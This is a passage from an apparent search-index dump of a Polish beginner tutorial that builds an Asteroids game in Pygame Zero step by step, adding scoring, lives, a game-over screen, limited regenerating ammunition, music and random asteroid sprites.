lasers_list.remove(laser)  # Usuwamy laser z gry\n                asteroids_list.remove(asteroid)  # Usuwamy asteroid\u0119 z gry\n                break  # Ko\u0144czymy p\u0119tl\u0119 przechodz\u0105c\u0105 po asteroidach i przechodzimy do kolejnego lasera\n\ndef add_asteroid():\n    asteroid = Actor(\"asteroid1\")\n    asteroid.x = random.randint(20, WIDTH-20)\n    asteroid.y = -10\n    asteroid.vy = random.randint(2, 10)\n    asteroids_list.append(asteroid)\n\ndef add_laser():  # Pomocnicza funkcja dodaj\u0105ca nowy laser do gry\n    laser = Actor(\"laser\")  # Tworzymy nowego aktora reprezentuj\u0105cego laser\n    laser.pos = ship.pos  # Ustawiamy pozycj\u0119 lasera na pozycj\u0119 statku\n    laser.vy = -8  # Ustawiamy pr\u0119dko\u015b\u0107 lasera\n    lasers_list.append(laser)  # Dodajemy laser do listy laser\u00f3w\n\ndef on_mouse_down(pos):  # Funkcja odczytuj\u0105ca klikni\u0119cia myszy\n    add_laser()  # Dodajemy nowy laser do gry\n    sounds.laser.play()  # Odtwarzamy d\u017awi\u0119k oddania strza\u0142u\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#punkty","title":"Punkty","text":"<p>Czas na zdobywanie i zliczanie punkt\u00f3w! Punkty zapami\u0119tamy w naszym statku w zmiennej points, dopisujemy wi\u0119c now\u0105 zmienn\u0105 do statku zaraz pod instrukcj\u0105 przypisuj\u0105c\u0105 pr\u0119dko\u015b\u0107 poziom\u0105 statkowi (<code>ship.vx = 5</code>).</p> <pre><code>ship.points = 0\n</code></pre> <p>Zanim przejdziemy do zliczania punkt\u00f3w, wy\u015bwietlmy je na ekranie. Dopiszemy wi\u0119c instrukcj\u0119 screen.draw.text na ko\u0144cu funkcji draw. </p> <pre><code>def draw():\n    ...\n    screen.draw.text()\n</code></pre> <p>Punkty zapisane w statku s\u0105 liczb\u0105, zamieniamy je wi\u0119c na tekst za pomoc\u0105 funkcji str.</p> <pre><code>def draw():\n    ...\n    screen.draw.text(str(ship.points))\n</code></pre> <p>\u015arodek (center) naszych punkt\u00f3w umie\u015bcimy w po\u0142owie szeroko\u015bci ekranu (\\(WIDTH / 2\\)) na samej g\u00f3rze, zachowuj\u0105c niewielki margines (\\(20\\)).</p> <pre><code>def draw():\n    ...\n    screen.draw.text(str(ship.points), center=(WIDTH / 2, 20))\n</code></pre> <p>Rozmiar czcionki (fontsize) ustawimy na \\(50\\).</p> <pre><code>def draw():\n    ...\n    screen.draw.text(str(ship.points), center=(WIDTH / 2, 20), fontsize=50)\n</code></pre> <p>Pozosta\u0142o nam ustawi\u0107 kolor (color) na \u017c\u00f3\u0142ty (yellow).</p> <pre><code>def draw():\n    ...\n    screen.draw.text(str(ship.points), center=(WIDTH / 2, 20), fontsize=50, color=\"yellow\")\n</code></pre> <p>Teraz punkty powinny by\u0107 widoczne na ekranie. Mo\u017cemy przej\u015b\u0107 do ich zliczania. B\u0119dziemy dostawa\u0107 po jednym punkcie za ka\u017cd\u0105 zniszczon\u0105 asteroid\u0119. Asteroidy niszczymy w naszej funkcji update_laser_hits. Dlatego jak ju\u017c usuniemy asteroid\u0119 z listy, zaraz przed instrukcj\u0105 break, dodamy jeden punkt do ship.points.</p> <pre><code>def update_lasers_hits():\n    for laser in lasers_list[:]:\n        for asteroid in asteroids_list[:]:\n            if laser.colliderect(asteroid):\n                ...\n                ship.points += 1\n                break\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#peny-kod_4","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport pygame\nimport random\n\nWIDTH = 600\nHEIGHT = 900\n\nship = Actor(\"ship\")\nship.x = WIDTH / 2\nship.y = HEIGHT - 60\nship.vx = 5\nship.points = 0  # Zapami\u0119tujemy liczb\u0119 zdobytych punkt\u00f3w\n\nasteroids_list = []\nlasers_list = []\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    for asteroid in asteroids_list:\n        asteroid.draw()\n\n    for laser in lasers_list:\n        laser.draw()\n\n    ship.draw()\n    screen.draw.text(str(ship.points), center=(WIDTH / 2, 20), fontsize=50, color=\"yellow\")  # Wy\u015bwietlamy liczb\u0119 zdoboytych punkt\u00f3w na ekranie gry\n\ndef update():\n    mouse_x, mouse_y = pygame.mouse.get_pos()\n    if mouse_x &lt; ship.x:\n        ship.x -= ship.vx\n\n    if mouse_x &gt; ship.x:\n        ship.x += ship.vx\n\n    if random.random() &lt; 0.02:\n        add_asteroid()\n\n    update_asteroids()\n    update_lasers()\n    update_lasers_hits()\n\ndef update_asteroids():\n    for asteroid in asteroids_list[:]:\n        asteroid.y += asteroid.vy\n        if asteroid.y &gt; HEIGHT + 50:\n            asteroids_list.remove(asteroid)\n\ndef update_lasers():\n    for laser in lasers_list[:]:\n        laser.y += laser.vy\n        if laser.y &lt; -laser.height:\n            lasers_list.remove(laser)\n\ndef update_lasers_hits():\n    for laser in lasers_list[:]:\n        for asteroid in asteroids_list[:]:\n            if laser.colliderect(asteroid):\n                lasers_list.remove(laser)\n                asteroids_list.remove(asteroid)\n                ship.points += 1  # Zwi\u0119kszamy liczb\u0119 punkt\u00f3w po zestrzeleniu asteroidy\n                break\n\ndef add_asteroid():\n    asteroid = Actor(\"asteroid1\")\n    asteroid.x = random.randint(20, WIDTH-20)\n    asteroid.y = -10\n    asteroid.vy = random.randint(2, 10)\n    asteroids_list.append(asteroid)\n\ndef add_laser():\n    laser = Actor(\"laser\")\n    laser.pos = ship.pos\n    laser.vy = -8\n    lasers_list.append(laser)\n\ndef on_mouse_down(pos):\n    add_laser()\n    sounds.laser.play()\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#zycia","title":"\u017bycia","text":"<p>Czas doda\u0107 \u017cycia do naszej gry. Te b\u0119dziemy reprezentowa\u0107 za pomoc\u0105 grafik ma\u0142ego statku, umieszczonych w lewym g\u00f3rnym rogu.</p> <p>Na pocz\u0105tku dopiszmy liczb\u0119 \u017cy\u0107 do naszego statku. Zaraz pod punktami statku dopiszemy jego \u017cycia zapisane w zmiennej lifes. Pocz\u0105tkowo b\u0119dziemy mie\u0107 trzy \u017cycia.</p> <pre><code>ship.lifes = 3\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#rysujemy-zycia","title":"Rysujemy \u017cycia","text":"<p>Jak ju\u017c wspomnieli\u015bmy, \u017cycia narysujemy w lewym g\u00f3rnym rogu ekranu za pomoc\u0105 grafik ma\u0142ego statku. Grafika, kt\u00f3rej u\u017cyjemy, nazywa si\u0119 life.png. Do rysowania \u017cy\u0107 stworzymy pomocnicz\u0105 funkcj\u0119 draw_lifes, kt\u00f3r\u0105 umie\u015bcimy zaraz pod funkcj\u0105 draw.</p> <pre><code>def draw_lifes():\n</code></pre> <p>B\u0119dziemy rysowa\u0107 tyle \u017cy\u0107, na ile wskazuje zmienna ship.lifes. W zwi\u0105zku z tym potrzebna nam p\u0119tla. U\u017cyjemy p\u0119tli for z licznikiem life_id, kt\u00f3ry b\u0119dzie oznacza\u0142 numer obecnie rysowanego \u017cycia, a jako zakres przejdziemy od \\(1\\) do liczby \u017cy\u0107 statku w\u0142\u0105cznie, czyli  <code>range(1, ship.lifes + 1)</code>.</p> <pre><code>def draw_lifes():\n    for life_id in range(1, ship.lifes + 1):\n</code></pre> <p>Wewn\u0105trz p\u0119tli zaczniemy od utworzenia nowego aktora na podstawie grafiki life.png. Zapiszemy go w zmiennej life.</p> <pre><code>def draw_lifes():\n    for life_id in range(1, ship.lifes + 1):\n        life = Actor(\"life\")\n</code></pre> <p>Teraz czas wyznaczy\u0107 wsp\u00f3\u0142rz\u0119dne naszego \u017cycia. Poniewa\u017c chcemy, by by\u0142y u\u0142o\u017cone obok siebie w jednej linii, to wsp\u00f3\u0142rz\u0119dna \\(x\\) b\u0119dzie zale\u017cna od numeru aktualnie rysowanego \u017cycia. Narysujemy \u017cycia tak, aby by\u0142y obok siebie, ale na siebie nie nachodzi\u0142y. Dlatego warto\u015b\u0107 wsp\u00f3\u0142rz\u0119dnej poziomej to nic innego jak numer \u017cycia przemno\u017cony przez szeroko\u015b\u0107 grafiki \u017cycia. Szeroko\u015b\u0107 grafiki aktora mo\u017cemy \u0142atwo pozna\u0107 pisz\u0105c life.width.</p> <pre><code>def draw_lifes():\n    for life_id in range(1, ship.lifes + 1):\n        life = Actor(\"life\")\n        life.x = life_id * life.width\n</code></pre> <p>Je\u017celi chodzi o po\u0142o\u017cenie w pionie, to nasze \u017cycia b\u0119d\u0105 dotyka\u0107 g\u00f3rnego brzegu ekranu, ale nie powinny poza niego wychodzi\u0107. W tym celu do wsp\u00f3\u0142rz\u0119dnej \\(y\\) przypiszemy po\u0142ow\u0119 wysoko\u015bci grafiki \u017cycia. Wysoko\u015b\u0107 grafiki aktora mo\u017cemy pobra\u0107 podobnie jak szeroko\u015b\u0107: life.height.</p> <pre><code>def draw_lifes():\n    for life_id in range(1, ship.lifes + 1):\n        life = Actor(\"life\")\n        life.x = life_id * life.width\n        life.y = life.height / 2\n</code></pre> <p>Pozosta\u0142o nam narysowa\u0107 naszego aktora na ekranie korzystaj\u0105c z metody draw.</p> <pre><code>def draw_lifes():\n    for life_id in range(1, ship.lifes + 1):\n        life = Actor(\"life\")\n        life.x = life_id * life.width\n        life.y = life.height / 2\n        life.draw()\n</code></pre> <p>Na koniec wywo\u0142amy nasz\u0105 now\u0105 funkcj\u0119 pomocnicz\u0105 wewn\u0105trz funkcji rysuj\u0105cej draw, by zobaczy\u0107 zmiany na ekranie. \u017bycia narysujemy na samym ko\u0144cu funkcji draw, tak by by\u0142y zawsze na wierzchu.</p> <pre><code>def draw():\n    ...\n    draw_lifes()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#tracimy-zycia","title":"Tracimy \u017cycia","text":"<p>\u017bycia b\u0119dziemy traci\u0107 za ka\u017cd\u0105 kolizj\u0119 z asteroid\u0105, najpierw jednak musimy te kolizje wykrywa\u0107. W tym celu zmodyfikujemy nasz\u0105 funkcj\u0119 update_asteroids, w kt\u00f3rej przemieszczamy asteroidy. Na ko\u0144cu tej funkcji mamy instrukcj\u0119 warunkow\u0105 sprawdzaj\u0105c\u0105, czy asteroida wylecia\u0142a poza ekran. Dopiszemy do niej kolejny warunek korzystaj\u0105c z instrukcji elif.</p> <pre><code>def update_asteroids():\n    for asteroid in asteroids_list[:]:\n        asteroid.y += asteroid.vy\n        if asteroid.y &gt; HEIGHT + 50:\n            asteroids_list.remove(asteroid)\n        elif\n</code></pre> <p>Jako warunek sprawdzimy, czy asteroida jest w kolizji ze statkiem, korzystaj\u0105c z metody colliderect.</p> <pre><code>def update_asteroids():\n    for asteroid in asteroids_list[:]:\n        asteroid.y += asteroid.vy\n        if asteroid.y &gt; HEIGHT + 50:\n            asteroids_list.remove(asteroid)\n        elif asteroid.colliderect(ship):\n</code></pre> <p>Je\u017celi asteroida uderzy\u0142a w statek, to stracimy jedno \u017cycie.</p> <pre><code>def update_asteroids():\n    for asteroid in asteroids_list[:]:\n        asteroid.y += asteroid.vy\n        if asteroid.y &gt; HEIGHT + 50:\n            asteroids_list.remove(asteroid)\n        elif asteroid.colliderect(ship):\n            ship.lifes -= 1\n</code></pre> <p>Usuniemy tak\u017ce asteroid\u0119, tak by nie stanowi\u0142a ju\u017c zagro\u017cenia.</p> <pre><code>def update_asteroids():\n    for asteroid in asteroids_list[:]:\n        asteroid.y += asteroid.vy\n        if asteroid.y &gt; HEIGHT + 50:\n            asteroids_list.remove(asteroid)\n        elif asteroid.colliderect(ship):\n            ship.lifes -= 1\n            asteroids_list.remove(asteroid)\n</code></pre> <p>Dopiszemy tak\u017ce u\u017cycie odpowiedniego d\u017awi\u0119ku po uderzeniu asteroidy w statek. Do dyspozycji mamy dwa d\u017awi\u0119ki: odg\u0142os tarczy (shield) oraz odg\u0142os wybuchu (explosion). Pierwszego u\u017cyjemy, gdy statek ma jeszcze jakie\u015b \u017cycia. B\u0119dzie to symulowa\u0107 uderzenie asteroidy w tarcze ochronne statku. W tym celu dopisujemy instrukcj\u0119 warunkow\u0105 (if) sprawdzaj\u0105c\u0105, czy statek ma wi\u0119cej \u017cy\u0107 ni\u017c zero (ship.lifes &gt; 0).</p> <pre><code>def update_asteroids():\n    for asteroid in asteroids_list[:]:\n        asteroid.y += asteroid.vy\n        if asteroid.y &gt; HEIGHT + 50:\n            asteroids_list.remove(asteroid)\n        elif asteroid.colliderect(ship):\n            ship.lifes -= 1\n            asteroids_list.remove(asteroid)\n            if ship.lifes &gt; 0:\n</code></pre> <p>Je\u017celi tak, to odtwarzamy d\u017awi\u0119k tarczy: <code>sounds.shield.play()</code>.</p> <pre><code>def update_asteroids():\n    for asteroid in asteroids_list[:]:\n        asteroid.y += asteroid.vy\n        if asteroid.y &gt; HEIGHT + 50:\n            asteroids_list.remove(asteroid)\n        elif asteroid.colliderect(ship):\n            ship.lifes -= 1\n            asteroids_list.remove(asteroid)\n            if ship.lifes &gt; 0:\n                sounds.shield.play()\n</code></pre> <p>W przeciwnym przypadku (else), tzn. gdy \u017cycia si\u0119 ju\u017c sko\u0144czy\u0142y, odtworzymy odg\u0142os wybuchu: <code>sounds.explosion.play()</code>.</p> <pre><code>def update_asteroids():\n    for asteroid in asteroids_list[:]:\n        asteroid.y += asteroid.vy\n        if asteroid.y &gt; HEIGHT + 50:\n            asteroids_list.remove(asteroid)\n        elif asteroid.colliderect(ship):\n            ship.lifes -= 1\n            asteroids_list.remove(asteroid)\n            if ship.lifes &gt; 0:\n                sounds.shield.play()\n            else:\n                sounds.explosion.play()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#koniec-gry","title":"Koniec gry","text":"<p>Nasza gra zako\u0144czy si\u0119, gdy stracimy wszystkie \u017cycia. W\u00f3wczas powinni\u015bmy wy\u015bwietli\u0107 komunikat GAME OVER oraz zako\u0144czy\u0107 aktualizacj\u0119 naszej gry. Zaczniemy od wy\u015bwietlenia komunikatu.</p> <p>Na ko\u0144cu funkcji rysuj\u0105cej draw sprawdzimy, korzystaj\u0105c z instrukcji warunkowej, czy stracili\u015bmy wczystkie \u017cycia, czli czy warto\u015b\u0107 \u017cy\u0107 jest mniejsza b\u0105d\u017a r\u00f3wna zero.</p> <pre><code>def draw():\n    ...\n    if ship.lifes &lt;= 0:\n</code></pre> <p>W\u00f3wczas wy\u015bwietlimy stosowny komunikat na \u015brodku ekranu. Mo\u017cemy go wy\u015bwietli\u0107 w \u017c\u00f3\u0142tym kolorze z czcionk\u0105 o rozmiarze \\(90\\).</p> <pre><code>def draw():\n    ...\n    if ship.lifes &lt;= 0:\n        screen.draw.text(\"GAME OVER\", center=(WIDTH / 2, HEIGHT / 2), fontsize=90, color=\"yellow\")\n</code></pre> <p>Przejd\u017amy teraz do zatrzymania naszej gry. W tym celu na pocz\u0105tku funkcji update sprawdzimy, podobnie jak to zrobili\u015bmy przed chwil\u0105, czy starcili\u015bmy wszystkie \u017cycia.</p> <pre><code>def update():\n    if ship.lifes &lt;= 0:\n\n    ...\n</code></pre> <p>Je\u017celi tak, to zako\u0144czymy dzia\u0142anie naszej funkcji korzystaj\u0105c z instrukcji return, tak by pozosta\u0142e akcje w niej zawarte nie zosta\u0142y wykonane.</p> <pre><code>def update():\n    if ship.lifes &lt;= 0:\n        return\n\n    ...\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#peny-kod_5","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport pygame\nimport random\n\nWIDTH = 600\nHEIGHT = 900\n\nship = Actor(\"ship\")\nship.x = WIDTH / 2\nship.y = HEIGHT - 60\nship.vx = 5\nship.points = 0\nship.lifes = 3  # Zapami\u0119tujemy liczb\u0119 dost\u0119pnych \u017cy\u0107\n\nasteroids_list = []\nlasers_list = []\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    for asteroid in asteroids_list:\n        asteroid.draw()\n\n    for laser in lasers_list:\n        laser.draw()\n\n    ship.draw()\n    screen.draw.text(str(ship.points), center=(WIDTH / 2, 20), fontsize=50, color=\"yellow\")\n    draw_lifes()  # Rysujemy \u017cycia na ekranie\n    if ship.lifes &lt;= 0:  # Je\u017celi sko\u0144czy\u0142y nam si\u0119 \u017cycia\n        screen.draw.text(\"GAME OVER\", center=(WIDTH / 2, HEIGHT / 2), fontsize=90, color=\"yellow\")  # Wy\u015bwietlamy napis \"GAME OVER\" na \u015brodku ekranu gry\n\ndef draw_lifes():  # Pomocnicza funkcja rysuj\u0105ca \u017cycia\n    for life_id in range(1, ship.lifes + 1):  # Przechodzimy p\u0119tl\u0105 od jeden do liczby dost\u0119pnych \u017cy\u0107 w\u0142\u0105cznie\n        life = Actor(\"life\")  # Tworzymy aktora reprezentuj\u0105cego \u017cycie\n        life.x = life_id * life.width  # Ustawiamy pozycj\u0119 poziom\u0105 aktora\n        life.y = life.height / 2  # Ustawiamy pozycj\u0119 aktora w pionie\n        life.draw()  # Rysujemy \u017cycie na ekranie\n\ndef update():\n    if ship.lifes &lt;= 0:  # Je\u017celi sko\u0144czy\u0142y nam si\u0119 \u017cycia\n        return  # Ko\u0144czymy dzia\u0142anie funkcji\n\n    mouse_x, mouse_y = pygame.mouse.get_pos()\n    if mouse_x &lt; ship.x:\n        ship.x -= ship.vx\n\n    if mouse_x &gt; ship.x:\n        ship.x += ship.vx\n\n    if random.random() &lt; 0.02:\n        add_asteroid()\n\n    update_asteroids()\n    update_lasers()\n    update_lasers_hits()\n\ndef update_asteroids():\n    for asteroid in asteroids_list[:]:\n        asteroid.y += asteroid.vy\n        if asteroid.y &gt; HEIGHT + 50:\n            asteroids_list.remove(asteroid)\n        elif asteroid.colliderect(ship):  # Sprawdzamy, czy asteroida zderzy\u0142a si\u0119 ze statkiem\n            ship.lifes -= 1  # Zmniejszamy liczb\u0119 pozosta\u0142ych \u017cy\u0107\n            asteroids_list.remove(asteroid)  # Usuwamy asteroid\u0119 z gry\n            if ship.lifes &gt; 0:  # Je\u017celi pozosta\u0142y jeszcze jakie\u015b \u017cycia\n                sounds.shield.play()  # Odtwarzamy d\u017awi\u0119k tarczy\n            else:  # W przeciwnym przypadku, gdy \u017cycia si\u0119 ju\u017c sko\u0144czy\u0142y\n                sounds.explosion.play()  # Odtwarzamy d\u017awi\u0119k wybuchu\n\ndef update_lasers():\n    for laser in lasers_list[:]:\n        laser.y += laser.vy\n        if laser.y &lt; -laser.height:\n            lasers_list.remove(laser)\n\ndef update_lasers_hits():\n    for laser in lasers_list[:]:\n        for asteroid in asteroids_list[:]:\n            if laser.colliderect(asteroid):\n                lasers_list.remove(laser)\n                asteroids_list.remove(asteroid)\n                ship.points += 1\n                break\n\ndef add_asteroid():\n    asteroid = Actor(\"asteroid1\")\n    asteroid.x = random.randint(20, WIDTH-20)\n    asteroid.y = -10\n    asteroid.vy = random.randint(2, 10)\n    asteroids_list.append(asteroid)\n\ndef add_laser():\n    laser = Actor(\"laser\")\n    laser.pos = ship.pos\n    laser.vy = -8\n    lasers_list.append(laser)\n\ndef on_mouse_down(pos):\n    add_laser()\n    sounds.laser.play()\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#amunicja","title":"Amunicja","text":"<p>Obecnie w naszej grze mo\u017cemy strzela\u0107 praktycznie w niesko\u0144czono\u015b\u0107, co znacz\u0105co u\u0142atwia rozgrywk\u0119. Pora to zmieni\u0107, ograniczaj\u0105c amunicj\u0119 statku. W tym celu dopiszemy do statku now\u0105 zmienn\u0105 ammunition o warto\u015bci \\(5\\). Dopiszemy j\u0105 zaraz pod liczb\u0105 \u017cy\u0107.</p> <pre><code>ship.ammunition = 5\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#zuzywamy-amunicje","title":"Zu\u017cywamy amunicj\u0119","text":"<p>Ka\u017cdy oddany strza\u0142 b\u0119dzie nas kosztowa\u0142 jedn\u0105 jednostk\u0119 amunicji. W tym celu, po ka\u017cdym strzale zmniejszymy warto\u015b\u0107 zmiennej ammunition przypisanej do statku. Strzelanie realizujemy wewn\u0105trz funkcji on_mouse_down i w\u0142a\u015bnie tam dopiszemy zmniejszanie liczby amunicji, na samym ko\u0144cu funkcji.</p> <pre><code>def on_mouse_down(pos):\n    ...\n    ship.ammunition -= 1\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#ograniczamy-strzelanie","title":"Ograniczamy strzelanie","text":"<p>Gdy amunicja si\u0119 sko\u0144czy, nie powinni\u015bmy m\u00f3c ju\u017c oddawa\u0107 kolejnych strza\u0142\u00f3w. Dlatego na pocz\u0105tku naszej odpowiedzialnej za oddawanie strza\u0142\u00f3w funkcji on_mouse_down dopiszemy instrukcj\u0119 warunkow\u0105 sprawdzaj\u0105c\u0105, czy amunicja jest mniejsza b\u0105d\u017a r\u00f3wna zero.</p> <pre><code>def on_mouse_down(pos):\n    if ship.ammunition &lt;= 0:\n\n    ...\n</code></pre> <p>Je\u017celi tak, to zako\u0144czymy dzia\u0142anie funkcji korzystaj\u0105c z instrukcji return, podobnie jak zrobili\u015bmy to w funkcji update.</p> <pre><code>def on_mouse_down(pos):\n    if ship.ammunition &lt;= 0:\n        return\n\n    ...\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#odzyskujemy-amunicje","title":"Odzyskujemy amunicj\u0119","text":"<p>C\u00f3\u017c to za gra, w kt\u00f3rej mo\u017cna odda\u0107 tylko \\(5\\) strza\u0142\u00f3w? Powinni\u015bmy jako\u015b odzyskiwa\u0107 nasz\u0105 stracon\u0105 amunicj\u0119. Poniewa\u017c nasz statek wystrzeliwuje lasery, to mo\u017cna sobie wyobrazi\u0107, \u017ce zu\u017cywa to energi\u0119, kt\u00f3r\u0105 z czasem mo\u017cemy zregenerowa\u0107. Dlatego amunicj\u0119 b\u0119dziemy odzyskiwa\u0107 po jednej sekundzie od ka\u017cdego oddanego strza\u0142u. Zanim jednak do tego przejdziemy, b\u0119dziemy potrzebowa\u0107 nowej pomocniczej funkcji, kt\u00f3r\u0105 nazwiemy regenerate_ammo i dopiszemy j\u0105 na samym ko\u0144cu, zaraz przed instrukcj\u0105 <code>pgzrun.go()</code>.</p> <pre><code>def regenerate_ammo():\n</code></pre> <p>Nasza funkcja ma tylko jeden cel: zwi\u0119ksza\u0107 amunicj\u0119 statku o jedn\u0105 jednostk\u0119.</p> <pre><code>def regenerate_ammo():\n    ship.ammunition += 1\n</code></pre> <p>Teraz mo\u017cemy przej\u015b\u0107 do w\u0142a\u015bciwej regeneracji. Do tego skorzystamy z wbudowanego w bibliotek\u0119 Pygame Zero mechanizmu zegara (clock). Mechanizm ten pozwala nam ustawi\u0107 (schedule) wywo\u0142anie wybranej funkcji po okre\u015bonej liczbie sekund. Zapiszemy to w nast\u0119puj\u0105cy spos\u00f3b: <code>clock.schedule(regenerate_ammo, 1)</code>. Pierwszy parametr oznacza nazw\u0119 funkcji do wywo\u0142ania (zauwa\u017c, \u017ce nie podajemy nawias\u00f3w po jej nazwie), drugi to natomiast liczba sekund, po kt\u00f3rej funkcja ma zosta\u0107 wywo\u0142ana.</p> <p>Ustawienie wywo\u0142ania funkcji regeneruj\u0105cej amunicj\u0119 dopiszemy na koniec funkcji on_mouse_down, tak by regeneracja nast\u0119powa\u0142a po ka\u017cdym oddanym strzale. Dzi\u0119ki temu zawsze b\u0119dziemy mie\u0107 co najwy\u017cej pi\u0119\u0107 jednostek amunicji.</p> <pre><code>def on_mouse_down(pos):\n    ...\n    clock.schedule(regenerate_ammo, 1)\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#peny-kod_6","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport pygame\nimport random\n\nWIDTH = 600\nHEIGHT = 900\n\nship = Actor(\"ship\")\nship.x = WIDTH / 2\nship.y = HEIGHT - 60\nship.vx = 5\nship.points = 0\nship.lifes = 3\nship.ammunition = 5  # Liczba dost\u0119pnej amunicji\n\nasteroids_list = []\nlasers_list = []\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    for asteroid in asteroids_list:\n        asteroid.draw()\n\n    for laser in lasers_list:\n        laser.draw()\n\n    ship.draw()\n    screen.draw.text(str(ship.points), center=(WIDTH / 2, 20), fontsize=50, color=\"yellow\")\n    draw_lifes()\n    if ship.lifes &lt;= 0:\n        screen.draw.text(\"GAME OVER\", center=(WIDTH / 2, HEIGHT / 2), fontsize=90, color=\"yellow\")\n\ndef draw_lifes():\n    for life_id in range(1, ship.lifes + 1):\n        life = Actor(\"life\")\n        life.x = life_id * life.width\n        life.y = life.height / 2\n        life.draw()\n\ndef update():\n    if ship.lifes &lt;= 0:\n        return\n\n    mouse_x, mouse_y = pygame.mouse.get_pos()\n    if mouse_x &lt; ship.x:\n        ship.x -= ship.vx\n\n    if mouse_x &gt; ship.x:\n        ship.x += ship.vx\n\n    if random.random() &lt; 0.02:\n        add_asteroid()\n\n    update_asteroids()\n    update_lasers()\n    update_lasers_hits()\n\ndef update_asteroids():\n    for asteroid in asteroids_list[:]:\n        asteroid.y += asteroid.vy\n        if asteroid.y &gt; HEIGHT + 50:\n            asteroids_list.remove(asteroid)\n        elif asteroid.colliderect(ship):\n            ship.lifes -= 1\n            asteroids_list.remove(asteroid)\n            if ship.lifes &gt; 0:\n                sounds.shield.play()\n            else:\n                sounds.explosion.play()\n\ndef update_lasers():\n    for laser in lasers_list[:]:\n        laser.y += laser.vy\n        if laser.y &lt; -laser.height:\n            lasers_list.remove(laser)\n\ndef update_lasers_hits():\n    for laser in lasers_list[:]:\n        for asteroid in asteroids_list[:]:\n            if laser.colliderect(asteroid):\n                lasers_list.remove(laser)\n                asteroids_list.remove(asteroid)\n                ship.points += 1\n                break\n\ndef add_asteroid():\n    asteroid = Actor(\"asteroid1\")\n    asteroid.x = random.randint(20, WIDTH-20)\n    asteroid.y = -10\n    asteroid.vy = random.randint(2, 10)\n    asteroids_list.append(asteroid)\n\ndef add_laser():\n    laser = Actor(\"laser\")\n    laser.pos = ship.pos\n    laser.vy = -8\n    lasers_list.append(laser)\n\ndef on_mouse_down(pos):\n    if ship.ammunition &lt;= 0:  # Je\u017celi nie mamy ju\u017c amunicji\n        return  # Ko\u0144czymy dzia\u0142anie funkcji, w ten spos\u00f3b nie oddaj\u0105c ju\u017c strza\u0142u\n\n    add_laser()\n    sounds.laser.play()\n    ship.ammunition -= 1  # Zmniejszamy liczb\u0119 pozosta\u0142ej amunicji o jeden\n    clock.schedule(regenerate_ammo, 1)  # Ustawiamy wywo\u0142anie regeneracji amunicji po up\u0142yni\u0119ciu jednej sekundy\n\ndef regenerate_ammo():  # Pomocnicza funkcja regeneruj\u0105ca amunicj\u0119\n    ship.ammunition += 1  # Regenerujemy amunicj\u0119 dodaj\u0105c warto\u015b\u0107 1 do zmiennej ammunition zapisanej w statku\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#koncowe-poprawki","title":"Ko\u0144cowe poprawki","text":"<p>Na koniec zrobimy jeszcze kilka rzeczy: ukryjemy wska\u017anik myszy, odtworzymy muzyk\u0119 w tle i wybierzemy losow\u0105 grafik\u0119 dla asteroid.</p>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#ukrywamy-wskaznik-myszy","title":"Ukrywamy wska\u017anik myszy","text":"<p>Ukrycie wska\u017anika myszy zapiszemy na samym ko\u0144cu naszego kodu, zaraz przed instrukcj\u0105 <code>pgzrun.go()</code>. Aby ukry\u0107 wska\u017anik skorzystamy z metody pygame.mouse.set_visible z biblioteki Pygame. Jako parametr, w okr\u0105g\u0142ych nawiasach, podamy warto\u015b\u0107 False, kt\u00f3ra oznacza, \u017ce wska\u017anik myszy nie ma by\u0107 widoczny.</p> <pre><code>pygame.mouse.set_visible(False)\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#odtwarzamy-muzyke","title":"Odtwarzamy muzyk\u0119","text":"<p>Odtworzenie muzyki r\u00f3wnie\u017c zapiszemy na ko\u0144cu kody, zaraz przed instrukcj\u0105 <code>pgzrun.go()</code>. Zrobimy to korzystaj\u0105c z metody music.play, jako parametr podaj\u0105c nazw\u0119 pliku d\u017awi\u0119kowego z katalogu music. Nasza muzyka b\u0119dzie odtwarzana w p\u0119tli przez ca\u0142y czas trwania rozgrywki.</p> <pre><code>music.play(\"space\")\n</code></pre> <p>Poniewa\u017c muzyka mo\u017ce by\u0107 do\u015b\u0107 g\u0142o\u015bna, to warto ustawi\u0107 jej g\u0142o\u015bno\u015b\u0107 na warto\u015b\u0107 \\(0.3\\), korzystaj\u0105c zmetody music.set_volume.</p> <pre><code>music.play(\"space\")\nmusic.set_volume(0.3)\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#losowa-grafika-dla-asteroid","title":"Losowa grafika dla asteroid","text":"<p>Gdy przyjrzymy si\u0119 naszym grafikom to zobaczymy, \u017ce mamy kilka grafik przedstawiaj\u0105cych asteroidy. Grafiki ponumerowane s\u0105 od \\(1\\) do \\(4\\). My natomiast u\u017cywamy tylko pierwszej grafiki. CZas to zmieni\u0107! W tym celu zmodyfikujemy nasz\u0105 funkcj\u0119 add_asteroid dodaj\u0105c\u0105 now\u0105 asteroid\u0119 do gry. Na samym jej pocz\u0105tku wylosujemy losow\u0105 liczb\u0119 z przedzia\u0142u od \\(1\\) do \\(4\\) za pomoc\u0105 metody random.randint i zapiszemy j\u0105 w zmiennej image_id.</p> <pre><code>def add_asteroid():\n    image_id = random.randint(1, 4)\n    ...\n</code></pre> <p>Teraz pozosta\u0142o nam zmodyfikowa\u0107 linijk\u0119 tworz\u0105c\u0105 